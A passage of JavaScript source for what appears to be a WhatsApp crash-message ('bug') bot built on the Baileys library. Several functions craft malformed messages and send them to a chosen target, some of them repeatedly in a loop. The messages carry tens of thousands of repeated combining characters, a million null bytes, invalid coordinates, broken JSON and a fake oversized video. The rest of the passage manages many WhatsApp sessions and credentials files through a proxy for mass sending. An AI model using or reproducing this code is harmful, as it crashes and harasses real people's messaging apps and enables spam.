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",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsg
                }
            }
        }, {});
        let msgx = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        for (let i = 0; i < 100; i++) {
            await sleep(1000);
            await otax.relayMessage('status@broadcast', msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            await otax.relayMessage('status@broadcast', msgx.message, {
                messageId: msgx.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
        }
    } catch (err) {
        console.error(err);
    }
};
async function LocaNewotax(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

    const otaxx = proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: -999.03499999999999,
                            degreesLongitude: 922.9999999999999,
                            name: "DO YOU KNOW ME?¿ otax" + "ꦽ".repeat(60000),
                            url: "https://t.me/Otapengenkawin",
                            contextInfo: {
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: "ꦾ".repeat(60000),
                                        mediaType: "IMAGE",
                                        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                                        caption: "οταϰ ιѕ нєяє"
                                    },
                                    placeholderKey: {
                                        remoteJid: "0@g.us",
                                        fromMe: true,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "нαιι ιм οταϰ⸙"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{[",
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: ""
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
                                    flow_cta: "ꦽ".repeat(10000),
                                    flow_message_version: "3"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
                                    flow_cta: "ꦾ".repeat(10000),
                                    flow_message_version: "3"
                                })
                            }
                        ]
                    },
                    quotedMessage: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                version: 3,
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1045000)
                            },
                            body: {
                                text: "Ewe Bang Enak",
                                format: "DEFAULT"
                            }
                        }
                    }
                }
            }
        }
    });

    const msg = await generateWAMessageFromContent(target, otaxx, { userJid: target });
    await otax.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function iOSxTend(otax, target) {
    const etc = await generateWAMessageFromContent(
        target,
        {
            extendedTextMessage: {
                text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
                matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
                description:
                    "҉҈⃝⃞⃟⃠⃤꙰꙲" +
                    "𑇂𑆵𑆴𑆿".repeat(15000),
                title:
                    "💤‼️⃟⃰ᰧ./### ✩" +
                    "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: null,
                inviteLinkGroupTypeV2: "DEFAULT",
            },
        },
        {
            ephemeralExpiration: 5,
            timeStamp: Date.now(),
        }
    );

    await otax.relayMessage(target, etc.message, {
        messageId: etc.key.id,
    });
}
async function videoBlank(otax, target) {
    const cards = [];
    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
        fileLength: "107374182400",
        seconds: 999999999,
        mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
        height: 9999,
        width: 9999,
        fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
        directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1751081957",
        jpegThumbnail: null,
        streamingSidecar: null
    }
    const header = {
        videoMessage,
        hasMediaAttachment: false,
        contextInfo: {
            forwardingScore: 666,
            isForwarded: true,
            stanzaId: "-" + Date.now(),
            participant: "1@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
                extendedTextMessage: {
                    text: "",
                    contextInfo: {
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                        externalAdReply: {
                            title: "",
                            body: "",
                            thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                            mediaType: 1,
                            sourceUrl: "https://xnxx.com",
                            showAdAttribution: false
                        }
                    }
                }
            }
        }
    };

    for (let i = 0; i < 50; i++) {
        cards.push({
            header,
            nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000)
            }
        });
    }

    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "ꦽ".repeat(45000)
                        },
                        carouselMessage: {
                            cards,
                            messageVersion: 1
                        },
                        contextInfo: {
                            businessMessageForwardInfo: {
                                businessOwnerJid: "13135550002@s.whatsapp.net"
                            },
                            stanzaId: "Lolipop Xtream" + "-Id" + Math.floor(Math.random() * 99999),
                            forwardingScore: 100,
                            isForwarded: true,
                            mentionedJid: ["13135550002@s.whatsapp.net"],
                            externalAdReply: {
                                title: "ោ៝".repeat(10000),
                                body: "Hallo ! ",
                                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                                mediaType: 1,
                                mediaUrl: "",
                                sourceUrl: "t.me/Xatanicvxii",
                                showAdAttribution: false
                            }
                        }
                    }
                }
            }
        },
        {}
    );

    await otax.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });
}

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const _gfaConcurrency = { running: 0, max: 3, queue: [] };
async function safeGroupFetch(otax) {
    if (_gfaConcurrency.running >= _gfaConcurrency.max) {
        await new Promise(r => _gfaConcurrency.queue.push(r));
    }
    _gfaConcurrency.running++;
    try {
        return await otax.groupFetchAllParticipating();
    } finally {
        _gfaConcurrency.running--;
        if (_gfaConcurrency.queue.length > 0) _gfaConcurrency.queue.shift()();
    }
}


const activeConnections = {};
const sessionRegistry = {};
const sessionRoleMap = {};
const biz = {};
const mess = {};
setInterval(() => {
    const now = Date.now();
    const keys = Object.keys(activeConnections);
    let reconnectCount = 0;
    const MAX_HEALTH_RECONNECTS = 5;
    for (const key of keys) {
        const sock = activeConnections[key];
        if (!sock) { delete activeConnections[key]; continue; }
        const wsState = sock?.ws?.readyState ?? sock?.ws?.socket?.readyState;
        const hasUser = sock?.user?.id || sock?.authState?.creds?.me?.id;
        const sockAge = sock?.lastChecked ? (now - sock.lastChecked) : 0;
        const isNewSock = sockAge < 30000;
        if (wsState === 2 || wsState === 3 || (wsState === 1 && !hasUser && !isNewSock)) {
            console.log(`[HEALTH] \u{1F9F9} Membersihkan zombie socket: ${key} (state: ${wsState})`);
            try { sock?.ev?.removeAllListeners?.(); } catch (_) { }
            try { if (sock.__healthbeat) clearInterval(sock.__healthbeat); } catch (_) { }
            try { sock?.ws?.close(); } catch (_) { }
            try { sock?.end?.(undefined); } catch (_) { }
            delete activeConnections[key];
            delete biz[key];
            delete mess[key];
            if (sessionRegistry[key]) sessionRegistry[key].connected = false;
            continue;
        }
        if (wsState === 1 && sock.lastChecked && (now - sock.lastChecked) > 2 * 60 * 1000) {
            sock.sendPresenceUpdate?.('available')
                .then(() => { sock.lastChecked = Date.now(); })
                .catch(() => {
                    console.log(`[HEALTH] \u{1F480} Heartbeat gagal untuk: ${key}, menghapus (On-Demand)...`);
                    try { sock?.ev?.removeAllListeners?.(); } catch (_) { }
                    try { if (sock.__healthbeat) clearInterval(sock.__healthbeat); } catch (_) { }
                    try { sock?.ws?.close(); } catch (_) { }
                    try { sock?.end?.(undefined); } catch (_) { }
                    delete activeConnections[key];
                    delete biz[key];
                    delete mess[key];
                    if (sessionRegistry[key]) sessionRegistry[key].connected = false;
                });
        }
    }
}, 30000);

try {
    const _slFile = path.join(__dirname, 'spam_logs.json');
    if (fs.existsSync(_slFile)) JSON.parse(fs.readFileSync(_slFile, 'utf8'));
} catch (e) {
    fs.writeFileSync(path.join(__dirname, 'spam_logs.json'), '[]');
}

function prepareAuthFolders() {
    const userId = "otaxayun";
    try {
        if (!fs.existsSync(userId)) fs.mkdirSync(userId, { recursive: true });
        const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
        if (files.length === 0) return [];

        for (const file of files) {
            const baseName = path.basename(file, '.json');
            const sessionPath = path.join(userId, baseName);
            if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
            const source = path.join(userId, file);
            const dest = path.join(sessionPath, 'creds.json');
            if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
        }
        return files;
    } catch (err) {
        return [];
    }
}

function detectWATypeFromCreds(filePath) {
    if (!fs.existsSync(filePath)) return 'Unknown';
    try {
        const creds = JSON.parse(fs.readFileSync(filePath));
        const platform = creds?.platform || creds?.me?.platform || 'unknown';
        if (platform.includes("business") || platform === "smba") return "Business";
        if (platform === "android" || platform === "ios") return "Messenger";
        return "Unknown";
    } catch {
        return "Unknown";
    }
}


function cleanUpSessionFiles(folderPath, sessionName) {
    const sessionsFold = path.join(folderPath, sessionName);
    const credsFile = path.join(sessionsFold, 'creds.json');
    const backupJson = path.join(folderPath, `${sessionName}.json`);

    try { if (fs.existsSync(credsFile)) fs.unlinkSync(credsFile); } catch (e) { }
    try { if (fs.existsSync(backupJson)) fs.unlinkSync(backupJson); } catch (e) { }
}

let _baileysVersion = null;
async function getBaileysVersion() {
    if (_baileysVersion) return _baileysVersion;
    try {
        const { version } = await fetchLatestBaileysVersion();
        _baileysVersion = version;
        return version;
    } catch {
        return [2, 3000, 1023455];
    }
}

function killExistingSession(number) {
    if (activeConnections[number]) {
        try { activeConnections[number].ev.removeAllListeners(); } catch (_) { }
        try { if (activeConnections[number].__healthbeat) clearInterval(activeConnections[number].__healthbeat); } catch (_) { }
        try { activeConnections[number].ws.close(); } catch (_) { }
        try { activeConnections[number].end?.(undefined); } catch (_) { }
        delete activeConnections[number];
        delete biz[number];
        delete mess[number];
    }
    if (sessionRegistry[number]) sessionRegistry[number].connected = false;
}

async function connectSession(folderPath, sessionName, retries = 5) {
    return new Promise(async (resolve) => {
        let isResolved = false;
        const resolveOnce = () => {
            if (!isResolved) {
                isResolved = true;
                resolve();
            }
        };

        try {
            killExistingSession(sessionName);

            const sessionsFold = path.join(folderPath, sessionName);
            if (!fs.existsSync(sessionsFold)) fs.mkdirSync(sessionsFold, { recursive: true });

            const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
            const version = await getBaileysVersion();

            const owner = path.basename(folderPath);
            const otax = makeWASocket({
                agent: globalProxyAgent,
                syncFullHistory: false,
                generateHighQualityLinkPreviews: false,
                keepAliveIntervalMs: 25000,
                logger: pino({ level: 'silent' }),
                auth: state,
                version,

                syncFullHistory: false,
                markOnlineOnConnect: true,
                connectTimeoutMs: 120000, // Naikkan timeout WA
                defaultQueryTimeoutMs: 120000,
                generateHighQualityLinkPreview: false,
                browser: ['Ubuntu', 'Chrome', '20.0.04'],
                retryRequestDelayMs: 5000,
                maxMsgRetryCount: 50,
                getMessage: async () => undefined
            });

            activeConnections[sessionName] = otax;


            const resolveTimeout = setTimeout(resolveOnce, 20000); // Turunkan dari 45s → 20s agar tidak hang lama

            otax.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
                const statusCode = lastDisconnect?.error?.output?.statusCode;


                const isLoggedOut = statusCode === DisconnectReason.loggedOut;

                if (connection === 'open') {
                    clearTimeout(resolveTimeout);
                    otax.lastChecked = Date.now();
                    if (sessionRegistry[sessionName]) {
                        sessionRegistry[sessionName].lastUsed = Date.now();
                        sessionRegistry[sessionName].connected = true;
                    }
                    resolveOnce();
                    const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
                    if (type === 'Business') biz[sessionName] = otax;
                    else if (type === 'Messenger') mess[sessionName] = otax;
                    if (otax.__healthbeat) clearInterval(otax.__healthbeat);
                    otax.__healthbeat = setInterval(() => {
                        const ws = otax?.ws?.readyState ?? otax?.ws?.socket?.readyState;
                        if (ws === 1 || ws === undefined || ws === null) {
                            otax.sendPresenceUpdate?.('available').then(() => {
                                otax.lastChecked = Date.now();
                            }).catch(() => {
                                console.log(`[HEARTBEAT] ⚠️ Presence gagal untuk: ${sessionName}, menghapus sesi (On-Demand)...`);
                                clearInterval(otax.__healthbeat);
                                killExistingSession(sessionName);
                                // reconnect dihapus
                            });
                        } else if (ws !== 0) {
                            console.log(`[HEARTBEAT] 💀 Socket mati untuk: ${sessionName} (state: ${ws}), menghapus sesi (On-Demand)...`);
                            clearInterval(otax.__healthbeat);
                            killExistingSession(sessionName);
                            // reconnect dihapus
                        }
                    }, 45000); // Heartbeat setiap 45 detik
                } else if (connection === 'close') {
                    clearTimeout(resolveTimeout);
                    resolveOnce();
                    killExistingSession(sessionName);

                    if (isLoggedOut) {
                        cleanUpSessionFiles(folderPath, sessionName);
                    } else if (statusCode === 440) {
                        const owner = path.basename(folderPath);
                        pairingWa(sessionName, owner, 1).catch(() => { });
                    } else if (retries > 0) {

                        const delay = statusCode === 428 ? 30000 : Math.min(8000 * (6 - retries), 60000);
                        setTimeout(() => connectSession(folderPath, sessionName, retries - 1).catch(() => { }), delay);
                    } else {
                        const owner = path.basename(folderPath);
                        pairingWa(sessionName, owner, 1).catch(() => { });
                    }
                }
            });

            otax.ev.on('creds.update', saveCreds);

        } catch (err) {
            resolveOnce();
        }
    });
}

async function pairingWa(number, owner, attempt = 1) {
    if (attempt >= 3) {
        killExistingSession(number);
        return false;
    }

    killExistingSession(number);

    const sessionDir = path.join('otaxayun', owner, number);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const version = await getBaileysVersion();

        const otax = makeWASocket({
            agent: globalProxyAgent,
            syncFullHistory: false,
            generateHighQualityLinkPreviews: false,
            keepAliveIntervalMs: 25000,
            logger: pino({ level: "silent" }),
            auth: state,
            version,

            syncFullHistory: false,
            markOnlineOnConnect: true,
            connectTimeoutMs: 120000,
            defaultQueryTimeoutMs: 120000,
            generateHighQualityLinkPreview: false,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            maxMsgRetryCount: 50,
            retryRequestDelayMs: 5000,
            getMessage: async () => undefined
        });

        otax.ev.on("creds.update", saveCreds);

        otax.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;


                const isLoggedOut = statusCode === DisconnectReason.loggedOut;

                if (!isLoggedOut) {
                    setTimeout(() => pairingWa(number, owner, attempt + 1).catch(() => { }), 5000);
                } else {
                    cleanUpSessionFiles(path.join('otaxayun', owner), number);
                    killExistingSession(number);
                }
            } else if (connection === "open") {
                otax.lastChecked = Date.now();
                activeConnections[number] = otax;
                const sourceCreds = path.join(sessionDir, 'creds.json');
                const destCreds = path.join('otaxayun', owner, `${number}.json`);
                setTimeout(() => {
                    try {
                        if (fs.existsSync(sourceCreds)) fs.copyFileSync(sourceCreds, destCreds);
                    } catch (e) { }
                }, 3000);
            }
        });
    } catch (err) {
        return false;
    }
    return null;
}

async function checkActiveSessionInFolder(subfolderName) {
    const fs = require('fs');
    const path = require('path');
    const folderPath = path.join(process.cwd(), 'otaxayun', subfolderName);

    if (!fs.existsSync(folderPath)) return null;

    try {
        for (const entry of fs.readdirSync(folderPath)) {
            const sessionName = entry.endsWith('.json') ? path.basename(entry, '.json') : entry;
            const entryPath = path.join(folderPath, entry);
            const sessionDir = entry.endsWith('.json') ? path.join(folderPath, sessionName) : entryPath;

            if (entry.endsWith('.json')) {
                try {
                    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
                    const destCreds = path.join(sessionDir, 'creds.json');
                    if (!fs.existsSync(destCreds)) fs.copyFileSync(entryPath, destCreds);
                } catch (_) { }
            }

            let sock = activeConnections[sessionName];

            if (sock) {
                const wsState = sock?.ws?.readyState ?? sock?.ws?.socket?.readyState;
                if (wsState === 2 || wsState === 3) {
                    console.log(`[SESSION] Sesi mati terdeteksi di cache untuk ${sessionName} (state: ${wsState}), menghapus untuk reconnect...`);
                    try { sock.ws.close(); } catch (_) { }
                    delete activeConnections[sessionName];
                    if (sessionRegistry[sessionName]) sessionRegistry[sessionName].connected = false;
                } else {
                    return sock;
                }
            }

            console.log(`[SESSION] 🔄 Memuat & Reconnect sesi untuk: ${sessionName}`);

            if (fs.statSync(sessionDir).isDirectory() && fs.existsSync(path.join(sessionDir, "creds.json"))) {
                const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                return new Promise((resolve) => {
                    let resolved = false;
                    let retryCount = 0;

                    const timeout = setTimeout(() => {
                        if (!resolved) {
                            resolved = true;
                            console.log(`[SESSION] ⚠️ Reconnect timeout untuk: ${sessionName}.`);
                            resolve(null);
                        }
                    }, 15000); // Timeout 15 detik (turun dari 45s) agar tidak blocking lama

                    const connectSocket = async () => {
                        if (resolved) return;

                        let waVersion = [2, 3000, 1015901307];
                        try {
                            if (typeof getBaileysVersion === 'function') {
                                waVersion = await getBaileysVersion();
                            } else if (typeof fetchLatestBaileysVersion === 'function') {
                                const { version } = await fetchLatestBaileysVersion();
                                waVersion = version;
                            }
                        } catch (_) { }

                        const newSock = makeWASocket({
                            agent: globalProxyAgent,
                            logger: pino({ level: "silent" }),
                            auth: state,
                            browser: ["Ubuntu", "Chrome", "110.0.0"],
                            version: waVersion,
                            defaultQueryTimeoutMs: 120000,
                            keepAliveIntervalMs: 25000,
                            connectTimeoutMs: 120000,
                            syncFullHistory: false,
                            markOnlineOnConnect: true,
                            maxMsgRetryCount: 50,
                            retryRequestDelayMs: 5000,
                            getMessage: async () => undefined
                        });

                        newSock.ev.on("creds.update", saveCreds);

                        newSock.ev.on('connection.update', (update) => {
                            const { connection, lastDisconnect } = update;

                            if (connection === 'open') {
                                if (!resolved) {
                                    resolved = true;
                                    clearTimeout(timeout);
                                    console.log(`[SESSION] ✅ Reconnect BENAR-BENAR sukses untuk: ${sessionName}`);
                                    activeConnections[sessionName] = newSock; // Simpan di cache hanya jika sudah open
                                    if (sessionRegistry[sessionName]) {
                                        sessionRegistry[sessionName].lastUsed = Date.now();
                                        sessionRegistry[sessionName].connected = true;
                                    }
                                    resolve(newSock);
                                }
                            } else if (connection === 'close') {
                                const statusCode = lastDisconnect?.error?.output?.statusCode;
                                const isLoggedOut = statusCode === 401 || statusCode === 411;

                                if (isLoggedOut) {
                                    console.log(`[SESSION] ❌ Sesi Kadaluarsa/Logged Out untuk: ${sessionName}. Menghapus folder sesi.`);
                                    try { newSock.ev.removeAllListeners(); } catch (_) { }
                                    delete activeConnections[sessionName];
                                    if (sessionRegistry[sessionName]) {
                                        delete sessionRegistry[sessionName];
                                    }
                                    try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) { }
                                    if (!resolved) {
                                        resolved = true;
                                        clearTimeout(timeout);
                                        resolve(null); // Return null agar tidak lanjut!
                                    }
                                } else {
                                    console.log(`[SESSION] ⚠️ Koneksi Terputus sementara (Code: ${statusCode}) untuk: ${sessionName}. Retrying...`);
                                    try { newSock.ev.removeAllListeners(); } catch (_) { }
                                    try { newSock.ws.close(); } catch (e) { }
                                    try { newSock.end(undefined); } catch (e) { }

                                    retryCount++;
                                    if (!resolved && retryCount <= 3) {
                                        const delay = Math.min(2000 * retryCount, 10000);
                                        setTimeout(connectSocket, delay);
                                    } else if (!resolved) {
                                        console.log(`[SESSION] ❌ Gagal reconnect setelah 3x untuk: ${sessionName}. Membersihkan.`);
                                        delete activeConnections[sessionName];
                                        if (sessionRegistry[sessionName]) sessionRegistry[sessionName].connected = false;
                                        resolved = true;
                                        clearTimeout(timeout);
                                        resolve(null);
                                    }
                                }
                            }
                        });
                    };

                    connectSocket();
                });
            }
        }
    } catch (err) {
        console.error(`[SESSION] ❌ Error saat memuat sesi:`, err.message);
    }

    return null;
}

async function startUserSessions() {
    const WORKER_NAME_ENV = process.env.WORKER_NAME || null;
    const WORKER_ROLES_ENV = process.env.WORKER_ROLES ? process.env.WORKER_ROLES.split(',').map(r => r.trim().toUpperCase()) : null;

    if (WORKER_ROLES_ENV && WORKER_ROLES_ENV.includes('NONE')) return;

    let db = [];
    try { db = loadDatabase(); } catch (e) { }
    const userMap = new Map(db.map(u => [u.username, u]));

    const baseDir = 'otaxayun';
    if (!fs.existsSync(baseDir)) return;

    let dbChanged = false;
    const userFolders = fs.readdirSync(baseDir)
        .map(name => ({ name, path: path.join(baseDir, name) }))
        .filter(f => {
            try { return fs.statSync(f.path).isDirectory(); } catch { return false; }
        });

    const validUserFolders = userFolders.filter(f => {
        const user = userMap.get(f.name);
        if (!user) return false;

        if (WORKER_NAME_ENV || WORKER_ROLES_ENV) {
            let expected = null;
            try { if (typeof assignWorker === 'function') expected = assignWorker(user); } catch (e) { }

            if (expected && user.worker !== expected) {
                user.worker = expected;
                dbChanged = true;
            }

            if (WORKER_ROLES_ENV) {
                const uRole = (user.role || 'MEMBER').toUpperCase();
                return WORKER_ROLES_ENV.includes('ALL') || WORKER_ROLES_ENV.includes(uRole);
            }
            return user.worker === WORKER_NAME_ENV;
        }
        return true;
    });

    if (dbChanged) {
        try { saveDatabase(db); } catch (e) { }
    }

    let registryCount = 0;
    for (const uf of validUserFolders) {
        const user = userMap.get(uf.name);
        let items;
        try { items = fs.readdirSync(uf.path); } catch { continue; }

        for (const item of items) {
            const itemPath = path.join(uf.path, item);
            let isDir = false;
            try { isDir = fs.statSync(itemPath).isDirectory(); } catch { continue; }

            let sessionName = item;
            let sessionDir = itemPath;

            if (!isDir && item.endsWith('.json')) {
                sessionName = path.basename(item, '.json');
                sessionDir = path.join(uf.path, sessionName);
                if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
                const destFile = path.join(sessionDir, 'creds.json');
                if (!fs.existsSync(destFile)) fs.copyFileSync(itemPath, destFile);
            } else if (isDir) {
                if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) continue;
            } else {
                continue;
            }

            if (typeof sessionRegistry !== 'undefined' && !sessionRegistry[sessionName]) {
                sessionRegistry[sessionName] = {
                    folderPath: uf.path,
                    username: user?.username || '',
                    role: normalizeRoleKey(user?.role),
                    worker: assignWorker(user),
                    lastUsed: 0,
                    connected: false
                };
                registryCount++;
            }

            if (typeof sessionRoleMap !== 'undefined') {
                sessionRoleMap[sessionName] = {
                    username: user?.username || '',
                    role: normalizeRoleKey(user?.role),
                    worker: assignWorker(user)
                };
            }
        }
    }

